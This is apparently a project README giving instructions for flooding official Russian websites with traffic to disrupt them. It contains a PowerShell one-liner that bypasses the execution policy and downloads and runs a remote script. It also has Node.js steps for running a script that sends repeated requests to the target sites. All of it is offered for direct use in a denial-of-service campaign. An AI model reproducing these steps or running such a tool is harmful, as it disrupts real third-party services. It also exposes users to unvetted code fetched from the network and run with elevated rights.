# What is this

The following script is flooding official Russian web sites with Internet traffic and causes disruption.

## How to Run (Windows 7+ only)

1. Open 'Windows PowerShell'. You may need to open it in admin/privilidedg mode
1. Copy and Paste the following script in the Powershell Window and Press Enter

```ps
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/givethemhell/shutthemdown/main/script.ps1'))
```

The script will create separate jobs that will constantly send requests to the listed web sites in the script. The script works as long as the PowerShell Window is open. If you want to stop the script, close the PowerShell window.

Thank you!

## Run on any machine

You will need to install the JavaScript run-time environment called Node.
You can dowload it from here: https://nodejs.dev/download
After installing Node, do the following:
change into the 'javascript' directory and install dependencies

```
cd ./javascript
npm i
```

If you run 'ls; in the command line, you should see this:

```
ls
node_modules  package-lock.json  script.js
```

After packages have been installed, you can run the 'script.js' file with node:

```
node script.js
```

This will attempt to ping all the websites 777 times.
You can change the amount of times the script will ping the websites by modifying the 'PING_ATTEMPTS' constant in the script

:)
